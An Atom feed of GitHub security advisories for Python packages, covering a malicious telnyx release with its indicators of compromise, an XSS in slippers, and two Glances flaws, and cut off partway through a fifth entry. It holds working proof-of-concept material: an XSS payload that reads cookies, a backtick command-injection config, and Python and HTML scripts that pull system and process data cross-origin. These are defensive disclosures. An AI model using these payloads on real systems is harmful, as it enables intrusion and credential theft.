<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-31T07:28:26.341Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[telnyx] Telnyx has malicious code in PyPI versions 4.87.1 and 4.87.2]]></title>
        <id>https://github.com/advisories/GHSA-955r-262c-33jc</id>
        <link href="https://github.com/advisories/GHSA-955r-262c-33jc"/>
        <updated>2026-03-30T19:15:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>On March 27, 2026, a threat actor used compromised PyPI credentials to publish malicious versions 4.87.1 and 4.87.2 of the <code>telnyx</code> Python package directly to PyPI. These versions contain credential-stealing malware and were not published through the legitimate GitHub release pipeline.</p>
<h2 id="exposure-window">Exposure Window</h2>
<table>
<thead>
<tr>
<th>Version</th>
<th>Published (UTC)</th>
<th>Quarantined (UTC)</th>
<th>Exposure</th>
</tr>
</thead>
<tbody><tr>
<td>4.87.1 (broken)</td>
<td>2026-03-27 03:51</td>
<td>2026-03-27 10:13</td>
<td>6h 22m</td>
</tr>
<tr>
<td>4.87.2 (functional)</td>
<td>2026-03-27 04:07</td>
<td>2026-03-27 10:13</td>
<td>6h 6m</td>
</tr>
</tbody></table>
<p><strong>Both versions were quarantined by PyPI at 2026-03-27 10:13 UTC.</strong></p>
<p><strong>Note:</strong> Version 4.87.1 contained a typo that prevented the malware from executing. Only 4.87.2 was fully functional.</p>
<h2 id="who-is-affected">Who Is Affected</h2>
<p>You may be affected if:</p>
<ul>
<li>You installed or upgraded the <code>telnyx</code> Python package between 03:51 UTC and 10:13 UTC on March 27, 2026</li>
<li>You ran <code>pip install telnyx</code> without pinning a version and received 4.87.1 or 4.87.2</li>
<li>A dependency in your project pulled in <code>telnyx</code> as a transitive, unpinned dependency</li>
</ul>
<p>You are NOT affected if:</p>
<ul>
<li>You pinned to version 4.87.0 or earlier</li>
<li>You installed before March 27, 2026 and did not upgrade</li>
<li>You built from GitHub source (malicious code was never committed to the repository)</li>
</ul>
<h2 id="attack-details">Attack Details</h2>
<h3 id="root-cause">Root Cause</h3>
<p>The attacker obtained the PyPI API token and uploaded malicious packages directly to PyPI, bypassing the GitHub release pipeline entirely. No malicious commits exist in the GitHub repository.</p>
<h3 id="malicious-behavior">Malicious Behavior</h3>
<p>The malware is injected into <code>telnyx/_client.py</code> (74 additional lines) and executes on <code>import telnyx</code>:</p>
<p><strong>Linux/macOS:</strong></p>
<ol>
<li>Spawns detached subprocess to survive parent exit</li>
<li>Downloads payload hidden inside WAV audio file (steganography) from C2</li>
<li>Harvests credentials: SSH keys, AWS/GCP/Azure creds, Kubernetes tokens, Docker configs, .env files, database credentials, crypto wallets</li>
<li>If Kubernetes access found, deploys privileged pods to all nodes for lateral movement</li>
<li>Encrypts with AES-256-CBC + RSA-4096, exfiltrates to C2</li>
</ol>
<p><strong>Windows:</strong></p>
<ol>
<li>Downloads binary hidden inside WAV file from C2</li>
<li>Drops as <code>msbuild.exe</code> in Startup folder for persistence</li>
<li>Executes with hidden window</li>
</ol>
<h3 id="version-differences">Version Differences</h3>
<table>
<thead>
<tr>
<th>Version</th>
<th>Status</th>
<th>Notes</th>
</tr>
</thead>
<tbody><tr>
<td>4.87.1</td>
<td>Broken</td>
<td>Typo: <code>Setup()</code> instead of <code>setup()</code> caused NameError</td>
</tr>
<tr>
<td>4.87.2</td>
<td>Functional</td>
<td>Attacker uploaded 16 minutes later to fix their own casing error; full attack chain operational</td>
</tr>
</tbody></table>
<h2 id="verified-safe-version">Verified Safe Version</h2>
<table>
<thead>
<tr>
<th>Version</th>
<th>File</th>
<th>SHA-256</th>
</tr>
</thead>
<tbody><tr>
<td><strong>4.87.0</strong></td>
<td><code>telnyx-4.87.0-py3-none-any.whl</code></td>
<td><code>5aeb8172c29ade224e6c2d166713f304596aa21e3dbfa5b6b2b028e6997f6bd2</code></td>
</tr>
<tr>
<td><strong>4.87.0</strong></td>
<td><code>telnyx-4.87.0.tar.gz</code></td>
<td><code>3f093a85c313c2b779594f99fc07f453f1a7fd8785878d963688c531ff94d03a</code></td>
</tr>
</tbody></table>
<h2 id="recommended-actions">Recommended Actions</h2>
<h3 id="1-check-if-you-are-affected">1. Check If You Are Affected</h3>
<pre><code class="language-bash"># Check installed version
pip show telnyx | grep Version

# Check pip cache for telnyx versions
pip cache list telnyx 2&gt;/dev/null

# Check when telnyx was installed (modification time)
ls -la $(python -c "import site; print(site.getsitepackages()[0])")/telnyx* 2&gt;/dev/null
</code></pre>
<h3 id="2-remove-compromised-versions">2. Remove Compromised Versions</h3>
<pre><code class="language-bash">pip uninstall telnyx
</code></pre>
<h3 id="3-rotate-all-potentially-exposed-secrets">3. Rotate All Potentially Exposed Secrets</h3>
<p>If there is any possibility that version 4.87.1 or 4.87.2 was installed in your environment, treat all accessible secrets as compromised:</p>
<ul>
<li>SSH keys</li>
<li>AWS/GCP/Azure credentials</li>
<li>Kubernetes tokens and service accounts</li>
<li>Docker registry credentials</li>
<li>Database passwords</li>
<li>API keys in .env files</li>
<li>Telnyx API keys</li>
</ul>
<h3 id="4-check-for-persistence-linuxmacos">4. Check for Persistence (Linux/macOS)</h3>
<pre><code class="language-bash"># Check for malicious systemd service
systemctl --user status audiomon 2&gt;/dev/null
ls -la ~/.config/audiomon/ 2&gt;/dev/null

# Check state file
ls -la /tmp/.initd_state 2&gt;/dev/null
</code></pre>
<h3 id="5-check-for-persistence-windows">5. Check for Persistence (Windows)</h3>
<pre><code class="language-powershell"># Check Startup folder
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe"
</code></pre>
<h3 id="6-pin-to-safe-version">6. Pin to Safe Version</h3>
<pre><code class="language-bash">pip install telnyx==4.87.0
</code></pre>
<p>Or in requirements.txt:</p>
<pre><code>telnyx==4.87.0
</code></pre>
<h2 id="indicators-of-compromise">Indicators of Compromise</h2>
<h3 id="malicious-package-hashes">Malicious Package Hashes</h3>
<table>
<thead>
<tr>
<th>File</th>
<th>SHA-256</th>
</tr>
</thead>
<tbody><tr>
<td><code>telnyx-4.87.1-py3-none-any.whl</code></td>
<td><code>7321caa303fe96ded0492c747d2f353c4f7d17185656fe292ab0a59e2bd0b8d9</code></td>
</tr>
<tr>
<td><code>telnyx-4.87.2-py3-none-any.whl</code></td>
<td><code>cd08115806662469bbedec4b03f8427b97c8a4b3bc1442dc18b72b4e19395fe3</code></td>
</tr>
</tbody></table>
<h3 id="network">Network</h3>
<table>
<thead>
<tr>
<th>IoC</th>
<th>Type</th>
</tr>
</thead>
<tbody><tr>
<td><code>83.142.209.203</code></td>
<td>C2 IP address</td>
</tr>
<tr>
<td><code>http://83.142.209.203:8080/ringtone.wav</code></td>
<td>Payload endpoint (Linux/macOS)</td>
</tr>
<tr>
<td><code>http://83.142.209.203:8080/hangup.wav</code></td>
<td>Payload endpoint (Windows)</td>
</tr>
<tr>
<td><code>http://83.142.209.203:8080/raw</code></td>
<td>Persistence polling endpoint</td>
</tr>
</tbody></table>
<h3 id="filesystem">Filesystem</h3>
<table>
<thead>
<tr>
<th>Path</th>
<th>Platform</th>
<th>Purpose</th>
</tr>
</thead>
<tbody><tr>
<td><code>~/.config/audiomon/audiomon.py</code></td>
<td>Linux/macOS</td>
<td>Persistence implant</td>
</tr>
<tr>
<td><code>~/.config/systemd/user/audiomon.service</code></td>
<td>Linux</td>
<td>Persistence service</td>
</tr>
<tr>
<td><code>/tmp/.initd_state</code></td>
<td>Linux/macOS</td>
<td>State tracking</td>
</tr>
<tr>
<td><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe</code></td>
<td>Windows</td>
<td>Persistence binary</td>
</tr>
<tr>
<td><code>msbuild.exe.lock</code></td>
<td>Windows</td>
<td>12-hour cooldown lock</td>
</tr>
</tbody></table>
<h3 id="exfiltration">Exfiltration</h3>
<ul>
<li>Archive name: <code>tpcp.tar.gz</code></li>
<li>HTTP header: <code>X-Filename: tpcp.tar.gz</code></li>
<li>Encryption: AES-256-CBC + RSA-4096 OAEP</li>
</ul>
<h2 id="attribution">Attribution</h2>
<p>This attack is attributed to <strong>TeamPCP</strong> with high confidence based on:</p>
<ul>
<li>Identical RSA-4096 public key as the LiteLLM compromise (March 24, 2026)</li>
<li><code>tpcp.tar.gz</code> archive naming convention (TeamPCP signature)</li>
<li>Identical AES-256-CBC + RSA OAEP encryption scheme</li>
<li>Same credential harvesting targets and techniques</li>
</ul>
<p>RSA Key Hash:</p>
<ul>
<li>PEM SHA-256: <code>4eceb569b4330565b93058465beab0e6d5ea09cfba8e7f29d7be1b5a2abd958a</code></li>
</ul>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://github.com/team-telnyx/telnyx-python/issues/235">https://github.com/team-telnyx/telnyx-python/issues/235</a></li>
<li><a href="https://www.endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm">https://www.endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm</a></li>
<li><a href="https://ramimac.me/teampcp">https://ramimac.me/teampcp</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/team-telnyx/telnyx-python/security/advisories/GHSA-955r-262c-33jc">https://github.com/team-telnyx/telnyx-python/security/advisories/GHSA-955r-262c-33jc</a></li>
<li><a href="https://github.com/team-telnyx/telnyx-python/issues/235">https://github.com/team-telnyx/telnyx-python/issues/235</a></li>
<li><a href="https://ramimac.me/teampcp">https://ramimac.me/teampcp</a></li>
<li><a href="https://www.endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm">https://www.endorlabs.com/learn/teampcp-strikes-again-telnyx-compromised-three-days-after-litellm</a></li>
<li><a href="https://github.com/advisories/GHSA-955r-262c-33jc">https://github.com/advisories/GHSA-955r-262c-33jc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-955r-262c-33jc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-30T19:15:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[slippers] Slippers Vulnerable to Cross-Site Scripting (XSS) in `attrs` Template Tag]]></title>
        <id>https://github.com/advisories/GHSA-w7rv-gfp4-j9j3</id>
        <link href="https://github.com/advisories/GHSA-w7rv-gfp4-j9j3"/>
        <updated>2026-03-30T17:20:05.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A Cross-site Scripting (XSS) vulnerability exists in the <code>{% attrs %}</code> template tag of the <code>slippers</code> Django package. When a context variable containing untrusted data is passed to <code>{% attrs %}</code>, the value is interpolated into an HTML attribute string without escaping, allowing an attacker to break out of the attribute context and inject arbitrary HTML or JavaScript into the rendered page.</p>
<h2 id="vulnerability-details">Vulnerability details</h2>
<h3 id="root-cause">Root cause</h3>
<p><code>AttrsNode</code> is a custom <code>Node</code> subclass registered via <code>register.tag()</code>. Unlike <code>register.simple_tag()</code>, which automatically applies <code>conditional_escape()</code> when autoescape is on, custom <code>Node.render()</code> methods receive no automatic escaping and are fully responsible for sanitising their output. <code>attr_string()</code> fails to do this:</p>
<pre><code class="language-python">def attr_string(key: str, value: Any):
    if isinstance(value, bool):
        return key if value else ""
    key = key.replace("_", "-")
    return f'{key}="{value}"'   # value is not escaped
</code></pre>
<h3 id="attack-scenario">Attack scenario</h3>
<p>Given a template that uses <code>{% attrs %}</code> with a user-supplied value:</p>
<pre><code class="language-django">{% load slippers %}
&lt;input {% attrs type placeholder %}&gt;
</code></pre>
<pre><code class="language-python">render(request, "search.html", {"placeholder": request.GET.get("q", "")})
</code></pre>
<p>An attacker crafting a request with <code>q=" onmouseover="alert(document.cookie)" x="</code> produces:</p>
<pre><code class="language-html">&lt;input type="text" placeholder="" onmouseover="alert(document.cookie)" x=""&gt;
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any template that passes values derived from user input, database content, or other untrusted sources to <code>{% attrs %}</code> is vulnerable. Successful exploitation can lead to session hijacking, credential theft, arbitrary actions on behalf of the victim, and page defacement.</p>
<h2 id="remediation">Remediation</h2>
<p>Replace the f-string in <code>attr_string()</code> with <code>format_html()</code>, which escapes both key and value:</p>
<pre><code class="language-python">from django.utils.html import format_html

def attr_string(key: str, value: Any):
    if isinstance(value, bool):
        return key if value else ""
    key = key.replace("_", "-")
    return format_html('{}="{}"', key, value)
</code></pre>
<p>Until a patch is available, sanitise untrusted values before passing them to <code>{% attrs %}</code>, for example with <code>django.utils.html.escape()</code> in the view layer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mixxorz/slippers/security/advisories/GHSA-w7rv-gfp4-j9j3">https://github.com/mixxorz/slippers/security/advisories/GHSA-w7rv-gfp4-j9j3</a></li>
<li><a href="https://github.com/mixxorz/slippers/commit/16cc4ef4fa8ad2f7aee30798f16c3e7b653423b2">https://github.com/mixxorz/slippers/commit/16cc4ef4fa8ad2f7aee30798f16c3e7b653423b2</a></li>
<li><a href="https://github.com/mixxorz/slippers/releases/tag/0.6.3">https://github.com/mixxorz/slippers/releases/tag/0.6.3</a></li>
<li><a href="https://github.com/advisories/GHSA-w7rv-gfp4-j9j3">https://github.com/advisories/GHSA-w7rv-gfp4-j9j3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w7rv-gfp4-j9j3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-30T17:20:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances Vulnerable to Command Injection via Dynamic Configuration Values]]></title>
        <id>https://github.com/advisories/GHSA-qhj7-v7h7-q4c7</id>
        <link href="https://github.com/advisories/GHSA-qhj7-v7h7-q4c7"/>
        <updated>2026-03-30T17:01:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Glances supports dynamic configuration values in which substrings enclosed in backticks are executed as system commands during configuration parsing. This behavior occurs in Config.get_value() and is implemented without validation or restriction of the executed commands.</p>
<p>If an attacker can modify or influence configuration files, arbitrary commands will execute automatically with the privileges of the Glances process during startup or configuration reload. In deployments where Glances runs with elevated privileges (e.g., as a system service), this may lead to privilege escalation.</p>
<h2 id="details">Details</h2>
<ol>
<li><p>Glances loads configuration files from user, system, or custom paths during initialization.</p>
</li>
<li><p>When retrieving a configuration value, Config.get_value() scans for substrings enclosed in backticks.</p>
<p><strong>File: glances/config.py</strong></p>
</li>
</ol>
<pre><code>match = self.re_pattern.findall(ret)
for m in match:
    ret = ret.replace(m, system_exec(m[1:-1]))
</code></pre>
<ol start="3">
<li><p>The extracted string is passed directly to system_exec().</p>
<p><strong>File: glances/globals.py</strong></p>
</li>
</ol>
<pre><code class="language-sh">res = subprocess.run(command.split(' '), stdout=subprocess.PIPE).stdout.decode('utf-8')
</code></pre>
<ol start="4">
<li>The command is executed and its output replaces the original configuration value.</li>
</ol>
<p>This execution occurs automatically whenever the configuration value is read.</p>
<h3 id="affected-files">Affected Files</h3>
<p>   glances/config.py — dynamic configuration parsing</p>
<p>   glances/globals.py — command execution helper</p>
<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
<p>Scenario: Arbitrary command execution via configuration value</p>
<p><strong>Step 1 — Create malicious configuration file</strong></p>
<pre><code class="language-sh">/tmp/glances.conf
</code></pre>
<p>add below txt on the file</p>
<pre><code>[outputs]
url_prefix = 'id'
</code></pre>
<p><strong>Step 2 — Launch Glances with custom configuration</strong></p>
<pre><code class="language-sh">glances -C /tmp/glances.conf
</code></pre>
<p><strong>Step 3 — Observe behavior</strong></p>
<p>When Glances reads the configuration:</p>
<ul>
<li>The command inside backticks is executed</li>
<li>Output replaces the configuration value</li>
<li>Execution occurs without user interaction</li>
</ul>
<p>  Reproduce using  Python code</p>
<pre><code>import subprocess
import re

def system_exec(command):
    return subprocess.run(command.split(' '), stdout=subprocess.PIPE).stdout.decode().strip()

value = "`id`"
pattern = re.compile(r'(`.+?`)')

for m in pattern.findall(value):
    print(system_exec(m[1:-1]))
</code></pre>
<p><strong>Output:</strong></p>
<p><code>uid=1000(user) gid=1000(user) groups=1000(user)</code></p>
<h2 id="impact">Impact</h2>
<h3 id="arbitrary-command-execution">Arbitrary Command Execution</h3>
<p>Any command enclosed in backticks inside a configuration value will execute with the privileges of the Glances process.</p>
<h3 id="potential-privilege-escalation">Potential Privilege Escalation</h3>
<p>If Glances runs as a privileged service (e.g., root), commands execute with those privileges.</p>
<p>Possible scenarios include:</p>
<ul>
<li>Misconfigured file permissions allowing unauthorized config modification</li>
<li>Shared systems where configuration directories are writable by multiple users</li>
<li>Container environments with mounted configuration volumes</li>
<li>Automated configuration management systems that ingest untrusted data</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-qhj7-v7h7-q4c7">https://github.com/nicolargo/glances/security/advisories/GHSA-qhj7-v7h7-q4c7</a></li>
<li><a href="https://github.com/advisories/GHSA-qhj7-v7h7-q4c7">https://github.com/advisories/GHSA-qhj7-v7h7-q4c7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qhj7-v7h7-q4c7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-30T17:01:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances Vulnerable to Cross-Origin System Information Disclosure via XML-RPC Server CORS Wildcard]]></title>
        <id>https://github.com/advisories/GHSA-7p93-6934-f4q7</id>
        <link href="https://github.com/advisories/GHSA-7p93-6934-f4q7"/>
        <updated>2026-03-30T17:00:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Glances XML-RPC server (activated with glances -s or glances --server) sends Access-Control-Allow-Origin: * on every HTTP response. Because the XML-RPC handler does not validate the Content-Type header, an attacker-controlled webpage can issue a CORS "simple request" (POST with Content-Type: text/plain) containing a valid XML-RPC payload. The browser sends the request without a preflight check, the server processes the XML body and returns the full system monitoring dataset, and the wildcard CORS header lets the attacker's JavaScript read the response. The result is complete exfiltration of hostname, OS version, IP addresses, CPU/memory/disk/network stats, and the full process list including command lines (which often contain tokens, passwords, or internal paths).</p>
<h3 id="details">Details</h3>
<p>File: glances/server.py, class GlancesXMLRPCHandler, line 41</p>
<pre><code class="language-python">def send_my_headers(self):
    self.send_header("Access-Control-Allow-Origin", "*")
</code></pre>
<p>This header is attached to every response from the XML-RPC server. The server inherits from SimpleXMLRPCRequestHandler which parses the POST body as XML regardless of the Content-Type header. Combined with the default unauthenticated configuration (server.isAuth = False, line 196), any website on the internet can call getAll(), getPlugin(), getAllPlugins(), getAllLimits(), or getAllViews() and read the results.</p>
<p>The REST API had the same issue and it was fixed in 4.5.1 (CVE-2026-32610). The XML-RPC server was not patched. The two components are entirely separate code paths: the REST API uses FastAPI/Uvicorn and is started with glances -w, while the XML-RPC server uses Python's xmlrpc.server and is started with glances -s. The attack works because POST with Content-Type: text/plain is classified as a CORS simple request by browsers, so no OPTIONS preflight is sent. The server never checks the Content-Type value, so the XML-RPC payload inside a text/plain body is parsed and executed normally.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites: Glances installed (any version including latest 4.5.1+), started in server mode.</p>
<p>Step 1. Start the Glances XML-RPC server on the target machine:</p>
<pre><code>glances -s -p 61209
</code></pre>
<p>Step 2. From any machine, run the Python PoC to confirm the issue server-side:</p>
<pre><code>python3 poc_test.py TARGET_IP 61209
</code></pre>
<p>Step 3. To demonstrate the browser attack, host poc_cors_xmlrpc.html on any web server (even a different origin). Open it in a browser, enter the target URL (<a href="http://TARGET_IP:61209">http://TARGET_IP:61209</a>), and click "Steal System Data". The page will display the full system monitoring data retrieved cross-origin.</p>
<p>Step 4. Alternatively, paste this into any browser console while on any website:</p>
<pre><code class="language-javascript">fetch("http://TARGET_IP:61209/RPC2", {
    method: "POST",
    headers: {"Content-Type": "text/plain"},
    body: '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;'
}).then(r =&gt; r.text()).then(d =&gt; {
    let m = d.match(/&lt;string&gt;([\s\S]*?)&lt;\/string&gt;/);
    let data = JSON.parse(m[1].replace(/&amp;lt;/g,"&lt;").replace(/&amp;gt;/g,"&gt;").replace(/&amp;amp;/g,"&amp;"));
    console.log("Hostname:", data.system.hostname);
    console.log("Processes:", data.processlist.length);
    console.log("First process cmdline:", data.processlist[0].cmdline);
});
</code></pre>
<p>Verified output from testing on Glances 4.5.3_dev01 (current main branch):</p>
<pre><code>[+] HTTP Status: 200
[+] Access-Control-Allow-Origin: *
[+] Successfully retrieved system data cross-origin.
Hostname:     claude
OS:           Linux 6.8.0-1024-gcp
Process count: 125
Top processes include full command lines with arguments
Total data categories exposed: 35
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any user who runs Glances in server mode (glances -s) on a network-accessible interface is vulnerable. A malicious website visited by anyone on the same network can silently extract the complete system monitoring dataset without any user interaction beyond visiting the page. The stolen data includes hostname, OS version, IP addresses, full process list with command lines (which commonly contain database credentials, API tokens, internal service URLs, and file paths), disk mount points, network interface details, and sensor readings. Default configuration has no authentication, making every XML-RPC server instance exploitable out of the box.</p>
<p>poc_test.py</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC: Cross-Origin Data Theft via Glances XML-RPC Server CORS Misconfiguration

This script simulates the browser-based attack by sending a POST request with
Content-Type: text/plain (CORS simple request) to the Glances XML-RPC server.

The server responds with Access-Control-Allow-Origin: * which allows any
webpage to read the full response containing system monitoring data.

Usage: python3 poc_test.py [target_host] [target_port]
Default: python3 poc_test.py 127.0.0.1 61209
"""

import http.client
import json
import sys
import xmlrpc.client


def main():
    host = sys.argv[1] if len(sys.argv) &gt; 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 61209

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Simulating cross-origin request (Content-Type: text/plain)")
    print()

    conn = http.client.HTTPConnection(host, port, timeout=10)

    # XML-RPC payload sent as text/plain to avoid CORS preflight
    payload = '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;'
    headers = {
        "Content-Type": "text/plain",
        "Origin": "http://evil-attacker.com",
    }

    try:
        conn.request("POST", "/RPC2", body=payload, headers=headers)
        response = conn.getresponse()
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sys.exit(1)

    print(f"[+] HTTP Status: {response.status}")
    cors = response.getheader("Access-Control-Allow-Origin")
    print(f"[+] Access-Control-Allow-Origin: {cors}")
    print()

    if cors != "*":
        print("[-] CORS header is not wildcard. Attack would not work.")
        sys.exit(1)

    data = response.read()
    result = xmlrpc.client.loads(data)[0][0]
    parsed = json.loads(result)

    print("[+] Successfully retrieved system data cross-origin.")
    print()
    print("=== Stolen System Information ===")
    print()

    system = parsed.get("system", {})
    print(f"Hostname:     {system.get('hostname', 'N/A')}")
    print(f"OS:           {system.get('os_name', 'N/A')} {system.get('os_version', '')}")
    print(f"Platform:     {system.get('platform', 'N/A')}")
    print(f"Distribution: {system.get('linux_distro', 'N/A')}")
    print()

    cpu = parsed.get("cpu", {})
    print(f"CPU user:     {cpu.get('user', 'N/A')}%")
    print(f"CPU system:   {cpu.get('system', 'N/A')}%")
    print(f"CPU cores:    {cpu.get('cpucore', 'N/A')}")
    print()

    mem = parsed.get("mem", {})
    total_mb = round((mem.get("total", 0)) / 1024 / 1024)
    used_mb = round((mem.get("used", 0)) / 1024 / 1024)
    print(f"Memory:       {used_mb}MB / {total_mb}MB ({mem.get('percent', 'N/A')}%)")
    print()

    ip_info = parsed.get("ip", {})
    print(f"IP Address:   {ip_info.get('address', 'N/A')}")
    print(f"Subnet Mask:  {ip_info.get('mask', 'N/A')}")
    print()

    procs = parsed.get("processlist", [])
    print(f"Process count: {len(procs)}")
    print()
    print("Top 5 processes by CPU (with command lines):")
    for p in sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)[:5]:
        cmdline = p.get("cmdline", [])
        cmd = " ".join(cmdline) if isinstance(cmdline, list) else str(cmdline)
        print(f"  PID {p.get('pid'):&gt;6} | {p.get('name', 'N/A'):&gt;20} | CPU {p.get('cpu_percent', 0):&gt;5.1f}% | {cmd[:100]}")

    print()
    print(f"[+] Total data categories exposed: {len(parsed.keys())}")
    print(f"[+] Categories: {', '.join(sorted(parsed.keys()))}")


if __name__ == "__main__":
    main()
</code></pre>
<p>poc_cors_xmlrpc.html</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Glances XML-RPC CORS PoC&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;Glances XML-RPC Cross-Origin Data Theft PoC&lt;/h2&gt;
&lt;p&gt;Target: &lt;input id="target" value="http://127.0.0.1:61209" size="40"&gt;&lt;/p&gt;
&lt;button onclick="exploit()"&gt;Steal System Data&lt;/button&gt;
&lt;pre id="output" style="background:#111;color:#0f0;padding:10px;max-height:600px;overflow:auto;"&gt;&lt;/pre&gt;
&lt;script&gt;
async function exploit() {
    const target = document.getElementById("target").value;
    const out = document.getElementById("output");
    out.textContent = "[*] Sending cross-origin XML-RPC request to " + target + "/RPC2\n";
    out.textContent += "[*] Content-Type: text/plain (CORS simple request, no preflight)\n\n";

    try {
        const resp = await fetch(target + "/RPC2", {
            method: "POST",
            headers: {"Content-Type": "text/plain"},
            body: '&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;getAll&lt;/methodName&gt;&lt;/methodCall&gt;'
        });

        out.textContent += "[+] Response status: " + resp.status + "\n";
        out.textContent += "[+] CORS header: " + resp.headers.get("Access-Control-Allow-Origin") + "\n\n";

        const xml = await resp.text();
        const match = xml.match(/&lt;string&gt;([\s\S]*?)&lt;\/string&gt;/);
        if (match) {
            const data = JSON.parse(match[1].replace(/&amp;lt;/g,"&lt;").replace(/&amp;gt;/g,"&gt;").replace(/&amp;amp;/g,"&amp;"));
            out.textContent += "[+] === STOLEN SYSTEM DATA ===\n\n";
            out.textContent += "Hostname: " + (data.system?.hostname || "N/A") + "\n";
            out.textContent += "OS: " + (data.system?.os_name || "N/A") + " " + (data.system?.os_version || "") + "\n";
            out.textContent += "CPU cores: " + (data.cpu?.cpucore || "N/A") + "\n";
            out.textContent += "CPU usage: " + (data.cpu?.user || "N/A") + "% user\n";
            out.textContent += "Memory: " + Math.round((data.mem?.used||0)/1024/1024) + "MB / " + Math.round((data.mem?.total||0)/1024/1024) + "MB\n";
            out.textContent += "Processes: " + (data.processlist?.length || 0) + "\n\n";

            if (data.processlist?.length &gt; 0) {
                out.textContent += "[+] Top 10 processes (with full command lines):\n";
                data.processlist.slice(0, 10).forEach(p =&gt; {
                    const cmd = Array.isArray(p.cmdline) ? p.cmdline.join(" ") : (p.cmdline || "");
                    out.textContent += "  PID " + p.pid + " | " + p.name + " | " + cmd.substring(0,120) + "\n";
                });
            }

            if (data.network?.length &gt; 0) {
                out.textContent += "\n[+] Network interfaces:\n";
                data.network.forEach(n =&gt; {
                    out.textContent += "  " + n.interface_name + " | RX: " + n.bytes_recv + " TX: " + n.bytes_sent + "\n";
                });
            }

            if (data.fs?.length &gt; 0) {
                out.textContent += "\n[+] Filesystems:\n";
                data.fs.forEach(f =&gt; {
                    out.textContent += "  " + f.mnt_point + " | " + f.device_name + " | " + f.percent + "% used\n";
                });
            }
        }
    } catch(e) {
        out.textContent += "[-] Error: " + e.message + "\n";
    }
}
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-7p93-6934-f4q7">https://github.com/nicolargo/glances/security/advisories/GHSA-7p93-6934-f4q7</a></li>
<li><a href="https://github.com/advisories/GHSA-7p93-6934-f4q7">https://github.com/advisories/GHSA-7p93-6934-f4q7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7p93-6934-f4q7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-30T17:00:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pygments] Pygments has Regular Expression Denial of Service (ReDoS) due to Inefficient Regex for GUID Matching]]></title>
        <id>https://github.com/advisories/GHSA-5239-wwwm-4pmq</id>
        <link href="https://github.com/advisories/GHSA-5239-wwwm-4pmq"/>
        <updated>2026-03-30T14:40:30.000Z</updated>
        <content type="html"><![CDATA[<p>A security flaw has been discovered in pygments before 2.20.0. The impacted element is the function AdlLexer of the file pygments/lexers/archetype.py. The manipulation results in inefficient regular expression complexity. The attack is only possible with local access. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
